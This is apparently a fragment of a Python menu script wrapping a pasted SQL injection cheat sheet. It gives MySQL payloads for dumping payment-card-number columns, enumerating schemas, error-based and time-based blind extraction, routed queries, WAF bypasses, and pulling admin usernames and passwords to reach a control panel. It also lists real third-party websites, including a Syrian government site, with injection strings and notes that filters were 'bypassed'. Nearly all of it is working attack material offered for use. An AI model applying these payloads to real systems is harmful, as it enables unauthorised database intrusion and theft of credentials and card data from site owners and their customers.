-------------------------------------------------------------------------
 DUMP cardnumber
-------------------------------------------------------------------------

(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select CASE WHEN ( (select  count(*) from information_schema.columns where table_name=@tbl and  column_name like 0x25636172646e756d62657225)>0) THEN  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a20636172646e756d626572202a2a2a203c2f623e3c666f6e7420636f6c6f723d6
26c75653e else 0x00 END)))))x)
--------------------------------------------------------------------------------------------

The Work Plans
Contents
➢ First, Look For a Target
➢ Second, Test The Target For SQL Vulnerability
➢ Note: Testing for Version
--------------------------------------------------------------------------------------------
Third, Find the Total Number of Columns
• Key Issue Find the Total Number of Columns
• 1- Another Method | Full Ask
• 2- Another Method | INTO+At sign
• 3- Another Method | PROCEDURE ANALYSE
• 4- Another Method | The Waf Behaviour.
--------------------------------------------------------------------------------------------
➢ Four, Find The Number Of Vulnerable Columns
➢ Five, Find The Table Names
➢ Six, Find The Column Names
➢ Seven, last Step Extract The uname and pass Column's Detail
➢ Eight, Get The Control Panel


-----------------------------------------------------------------------------------------
increase with gro.up by like this

%0Bgroup%0Bby%0A1%23
%0Bgroup%0Bby%0A1,2%23
%0Bgroup%0Bby%0A1,2,3%23
%0Bgroup%0Bby%0A1,2,3,4%23
%0Bgroup%0Bby%0A1,2,3,4,5%23
%0Bgroup%0Bby%0A1,2,3,4,5,6%23


"""


clear()
print(einfo)
input("[Pres Enter]")

clear()



level5='''


 and polygon((select * from(SELECT ((SELECT * from (select * from information_schema.tables where table_schema=database() limit 0,1)x) = (select * from information_schema.tables where table_schema=database() limit 1) )``)o))

 and polygon((select * from(SELECT ((SELECT * from (select * from information_schema.tables where table_schema=database() limit 14,1)x) = (select * from information_schema.tables where table_schema=database() limit 1) )``)o))

 and polygon((select * from(SELECT ((SELECT * from (select * from siteadmin limit 0,1)x) = (select * from siteadmin limit 1) )``)o))


-------------------------------------------------------------------------
Routed Query 
-------------------------------------------------------------------------

0x + your hex code



-------------------------------------------------------------------------
Regular Injection 
-------------------------------------------------------------------------
cat=.1 ` union selct 1,2 `
cat=.1  union selct 1,2 `


` |backquote/backtick|



-------------------------------------------------------------------------

show staff in source 
-------------------------------------------------------------------------


concat(0x223e3c62723e,version(),0x3c696d67207372633d22)





-------------------------------------------------------------------------
Flow Control [Function To Control ID Output]  |  Flow Control 
-------------------------------------------------------------------------

||!{BlackRose}


And MOD(29,9) 

www.binaryhexconverter.com/ascii-text-to-binary-converter


concat%23aaaaaaaaaaa%0a(0b00101110001011100100111001100001011011010110010100100000001110100011101000100000010000010110100001101101011001010110010000100000010001010110110000100000010011010110010101101100011001010110011101111001,0b00111100011000100111001000111110,0b00101110,0b00101110,0b0101011001100101011100100111001101101001011011110110111000100000001110100011101000100000,0b00101110,version/*x*/(),0b00111100011000100111001000111110,0b00101110001011100101010101110011011001010111001000100000001110100011101000100000,user/*x*/(),0b00111100011000100111001000111110,0b0010111000101110010001000110000101110100011000010110001001100001011100110110010100100000001110100011101000100000,0b00101110,database/*x*/(),0b00111100011000100111001000111110,0b00111100011000100111001000111110,0b00101110001011100100010001101001011011110111001100100000001110100011101000100000,0b00111100011000100111001000111110,0b00111100011000100111001000111110)

'''
clear()
print(level5)
input("[Pres Enter]")

clear()



EXP='''
1-Error Based SQL Injection Using EXP.

' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where
table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -



2-BIGINT Overflow Error Based SQL Injection.
' or !(select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where
table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)-~0-- -

'''




clear()
print(EXP)
input("[Pres Enter]")

clear()






routed=""" 
post data
cookies base
routed quary


 """

'''
suck


concat( @n_d:=0x00,@i:=0x00,@o:=0x00,if( benchmark( (select count(*) from information_schema.schemata), @o:=CONCAT(@o,(Select concat( 0x266e6273703b,LPAD(@n_d:=@n_d%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d7265643e3c623e,@i:=schema_name,0x3c2f623e20286e756d626572206f66207461626c657320696e2064617461626173653a20,@NumberOfDatabases:=(select count(*) from information_schema.tables where table_schema=@i),0x293c2f666f6e743e,0x3c62723e,
concat(@n_t:=0x00,@tbl:=0x00,@out_tbl:=0x00,if( benchmark( @NumberOfDatabases,@out_tbl:=CONCAT( @out_tbl,( Select concat( repeat(0x266e6273703b,8),LPAD(@n_t:=@n_t%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d677265656e3e3c623e,@tbl:=table_name,0x3c2f623e20286e756d626572206f6620636f6c756d6e7320696e207461626c653a20,@NumberOfColumns:=(select count(*) from information_schema.columns where table_schema=@i and table_name=@tbl),0x293c2f666f6e743e,concat( @n_c:=0x00,@clm:=0x00,@clm_out:=0x00,if( benchmark( @NumberOfColumns,@clm_out:=CONCAT( @clm_out,0x3c62723e,repeat(0x266e6273703b ,16),LPAD(@n_c:=@n_c%2b1,3,0x30),0x2e20203c666f6e7420636f6c6f723d626c75653e,(Select (@clm:=column_name) from information_schema.columns where (table_name=@tbl) and column_name>@clm order by column_name LIMIT 1),0x3c2f666f6e743e))=0, @clm_out, 0x00), 0x3c62723e)) from information_schema.tables where table_schema=@i and table_name>@tbl order by table_name LIMIT 1)))=0, @out_tbl, 0x00))) from information_schema.schemata where schema_name>@i order by schema_name LIMIT 1)))=0,@o,0x00))



#__TA__ #__C1__#__C2__
----------------------------------
(/*!50000select*/(@) /*!50000from*/ (/*!50000select*/ (@:=0x00),(/*!50000select*/ (@) /*!50000from*/ (__TA__) /*!50000where*/ (@) in
(@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)
---------------------------------------------------------------------------------------------------------------------------------------


'''
"""

(@:=1)||@+group+by+concat((select+version()),0x7e,!@)+having+@||min(@:=0)-- -
Second : Getting The Table Names


(@:=1)||@+group+by+concat((select+table_name+from+information_schema.tables+whe​re+table_schema=database()
+limit+0,1),0x7e,!@)+having+@||min(@:=0)-- -

Third: Getting the column names within the users table

(@:=1)||@+group+by+concat((select+column_name+from+information_schema.columns+w​
here+table_name=0xTABLEHEX+limit+0,1),0x7e,!@)+having+@||min(@:=0)-- -



(@:=1)||@+group+by+concat((select+concat(COLUMN1,0x7e,COLUMN2)+from+TABLENAME+l​imit+0,1),0x7e,!@)
+having+@||min(@:=0)-- -

"""

links ="""

https://www.fengrain.co.uk/news.php?id=.445 un<>ion se<>lect .1,.2,.3,.4,.5,.6,.7,.8,.9,con<>cat(0x223e3c62723e,version(),0x3c696d67207372633d22),.11,.12,.13,.14,.15,.16,.17,.18,.19,.20,.21,.22,.23,.24,.25,.26,.27,.28,.29,.30,.31,.32,.33,.34,.35,.36,.37,.38,.39,.40,.41,.42-- -





1- Single Quote ↳ '
2- Double Quote ↳ "
3- Letter ↳ a
4- Adding Letter To Single Quote ↳ 'a Or To Double Quote ↳ "a
5- Adding Dot . Befor The Variable And Then Adding Single Quote After ↳ ID=.10'
6- Adding Dot . Befor The Variable And After The Variable IN The Same Time ↳ ID=.10.
7- Adding Single Quote Befor Variable Number ↳ ID='10
8- Delete The Variable Number And Just Adding Single Quote ↳ ID='
9- Delete The Variable And Add Just Slash Condition ↳ =\
10- Use ‫‪Logical‬‬ ‫‪Operator‬‬ ↳ And 1=1 , And 1=2

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

https://jdclement.com/en/amis.php?id=73489"
https://pizzacrust.com.pk/deals.php?id=38"
 
http://www.alphaonenow.org/story.php?news_id=.5597
http://www.alphaonenow.org/story.php?news_id=5597'
http://www.alphaonenow.org/story.php?news_id=\
http://www.alphaonenow.org/story.php?news_id=.5597 order by 100 -- -
 
mahrukat.gov.sy/answercomplaints.php?id=12' >> waf Forbidden)
mahrukat.gov.sy/answercomplaints.php?id=12'a >> bypassed :)
http://mahrukat.gov.sy/answercomplaints.php?id=12a Work

    http://mahrukat.gov.sy/answercomplaints.php?id=\ Error




2- •◘╚╦☆ Work For SQLI WAF Bypassing By Using False Statement ☆╚╦◘•

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=polygon(10) union/**/DistinctRow select 1,2-- -
&id=polygon(point(53,12)) union/**/DistinctRow select 1,2-- -
&id=polygon@' union/**/DistinctRow select 1,2-- -
&id=@10 union/**/DistinctRow select 1,2-- -
&id=@@new union/**/DistinctRow select 1,2-- -

    &id=@-.@union/**/DistinctRow select 1,2-- -



Example

    Quote:
    https://pizzacrust.com.pk/deals.php?id=polygon@" order by 100 asc-- -


Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=10 %26%26 NULL union/**/DistinctRow select 1,2-- -
&id=@ Or 1<0 union/**/DistinctRow select 1,2-- -

    &id=@<0union/**/DistinctRow select 1,2-- -



Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=10 And point(53,12) union/**/DistinctRow select 1,2-- -
&id=10 And RADIANS(point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Polygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Multipolygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Linestring(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Multilinestring(Point(53,12)) union/**/DistinctRow select 1,2-- -

    &id=10 And Geometrycollection(Point(53,12)) union/**/DistinctRow select 1,2-- -



Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=10 And MOD(29,9) union/**/DistinctRow select 1,2-- -
&id=10 And MOD(234, 10) union/**/DistinctRow select 1,2-- -

    &id=10 %26%26 MOD(29,9) union/**/DistinctRow select 1,2-- -



Data hosted with ♥ by Pastebin.com - Download Raw - See Original

    &id={f -@} union/**/DistinctRow select 1,2-- -



# Normal Logical operators #

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=10 IS NOT NULL=0 union/**/DistinctRow select 1,2-- -
&id=10 And NAME_CONST(version(),0) union/**/DistinctRow select 1,2-- -
&id=10 NOT LIKE 1 union/**/DistinctRow select 1,2-- -
&id=10 IS NULL union/**/DistinctRow select 1,2-- -
&id=10 IS FALSE union/**/DistinctRow select 1,2-- -
&id=10 And 253 % 1 union/**/DistinctRow select 1,2-- -
&id=10 And 253 %25 union/**/DistinctRow select 1,2-- -
&id=10 || FALSE union/**/DistinctRow select 1,2-- -
 
%26%26 SIGN(-0) union/**/DistinctRow select 1,2-- -
%26%26 FLOOR(-0.0) union/**/DistinctRow select 1,2-- -
%26%26 CEILING(-0.23) union/**/DistinctRow select 1,2-- -
%26%26 ROUND(-0.23) union/**/DistinctRow select 1,2-- -
%26%26 EXP(-800) union/**/DistinctRow select 1,2-- -
%26%26 LOG(-1) union/**/DistinctRow select 1,2-- -
%26%26 LOG10(-100) union/**/DistinctRow select 1,2-- -
%26%26 POW(0,-2) union/**/DistinctRow select 1,2-- -
%26%26 SQRT(0) union/**/DistinctRow select 1,2-- -
%26%26 ACOS(1.0001) union/**/DistinctRow select 1,2-- -
%26%26 ASIN(0.2) union/**/DistinctRow select 1,2-- -
%26%26 ATAN(-1,2) union/**/DistinctRow select 1,2-- -
%26%26 COT(0) union/**/DistinctRow select 1,2-- -
%26%26 RAND(0) union/**/DistinctRow select 1,2-- -
%26%26 LEAST(2,0) union/**/DistinctRow select 1,2-- -
%26%26 GREATEST(0,0) union/**/DistinctRow select 1,2-- -
%26%26 RADIANS(0) union/**/DistinctRow select 1,2-- -
%26%26 TRUNCATE(0.999,0) union/**/DistinctRow select 1,2-- -
%26%26 TRUNCATE(0.0*100,0) union/**/DistinctRow select 1,2-- -
And POWER(0,1) union/**/DistinctRow select 1,2-- -

    And POW(0,1) union/**/DistinctRow select 1,2-- -



# Blind TIME BASED ⌛   |  8°-SQLI-☠ #

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

And (sleep(0))
And (sleep(25))
And SLEEP(25)=1
And SLEEP(25)=1 LIMIT 1
And BENCHMARK(200000,id)
%26%26 BENCHMARK(200000,id)
And BENCHMARK(200000,md5(id))
%26%26 BENCHMARK(200000,md5(id))
And BENCHMARK(1000000,MD5('A'))

    And BENCHMARK(200000,md5(NOW())


3- •◘╚╦☆ Nulling The Column ☆╚╦◘•

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

GHI&ID=10 union select 0x322d2d202d,2,3,4,5,6,7-- -
GHI&ID=10 union select 1,IFNULL(0x3023,0),3,4,5,6,7-- -
GHI&ID=10 union select 1,2,NULLIF(0x3023,1),4,5,6,7-- -
GHI&ID=10 union select 1,2,3,IFNULL(NULL,10),5,6,7-- -
GHI&ID=10 union select 1,2,3,4,IFNULL(1/0,'No'),6,7-- -
GHI&ID=10 union select 1,2,3,4,5,IF(0.1<>0,1,0),7-- -

    GHI&ID=10 union select 1,1,1,1,1,1,1-- -


# Other knowledge not to us #

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

id=.58'limit 1,1 union select Null,2,3-- -
id=.58'limit 1,1 union select 1,Null,3-- -
id=.58'limit 1,1 union select 1,2,Null-- -
 
id=.58'limit 1,1 union select true,2,3-- -
id=.58'limit 1,1 union select 1,true,3-- -
id=.58'limit 1,1 union select 1,2,true-- -
 
# Brute Forcing Columns #
 
news.php?id=.58'and 0 union select 1111 -- -
news.php?id=.58'and 0 union select 11111,2222-- -
news.php?id=.58'and 0 union select 11111,2222,3333-- -
news.php?id=.58'and 0 union select 11111,2222,3333,4444-- -
 
# multiple queries #
 
id=.58'limit 1,1 union select 0x3023,2,3-- -
id=.58'limit 1,1 union select 1,0x3023,3-- -

    id=.58'limit 1,1 union select 1,2,0x3023-- -


4- •◘╚╦☆ The Join Syntax Multiple Queries Injection In Routed Query Mode ☆╚╦◘•

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=10 union select "@' union select * from (select Column_Number_1)Alias_Name join (select Column_Number_2)Alias_Name ETC %23"--%a0
 

    http://testphp.vulnweb.com/listproducts.php?cat=@ union select "@' union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e join (select 6)f join (select 7)g join (select 8)h join (select 9)i join (select 10)j join (select 11)k %23"--%a0


5- •◘╚╦☆ Adding Data By Using Encoding ☆╚╦◘•

# Famous Issues #

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

Using Hex | 0x123456 ,bypass for waf: x'123456'
Using Character Chart | CONCAT(CHAR(104),CHAR(105))
Using Binary | 0b123456

    Using Seprate Letters | concat('H','i') ,bypass for waf: concat(0x12345,0x67890)


6- •◘╚╦☆ if table only except number from pass column in Windows server ☆╚╦◘•

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=10+and+1=convert(int,(select+top+1+pass+from+admin))-- Not Work
 
Solution = QUOTENAME ( 'character_string' [ , 'quote_character' ] )
 

    &id=10+and+1=convert(int,(select+top+1+QUOTENAME(PASS,'''')+from+Table))-- Work Good


7- •◘╚╦☆ Get Column NUmber ☆╚╦◘•

Data hosted with ♥ by Pastebin.com - Download Raw - See Original

&id=10 LIMIT 1,1 PROCEDURE ANALYSE() Get the first column's Number
&id=10 LIMIT 1,1 PROCEDURE ANALYSE() Get the second column's Number
&id=10 LIMIT 2,1 PROCEDURE ANALYSE() Get the third column's Number
 

    ETC......



•◘╚╦☆ End What We Will Share With You Hope You Wait More From Us Soon ☆╚╦◘•

Big Regards For All my friend ^__^

-----------------------------------------------------------------------------------------------------------------------------

id=1 -2
id=.10
id=-10
id=null
id=9999
id==10
=10=10
id=(-10) 

id=polygon@
id=polygon(point(53,12)) 

A Polygon is a two-dimensional surface stored as a sequence of points defining an exterior bounding ring and zero or more interior rings, The function polygon() only work with the function point() & A MultiPolygon instance is a collection of zero or more Polygon instances.


PHP Code
2- And Polygon(Point(53,12))
3- And Multipolygon(Point(53,12))
4- And Linestring(Point(53,12))
5- And Multilinestring(Point(53,12))
6- And Geometrycollection(Point(53,12)) 
"""


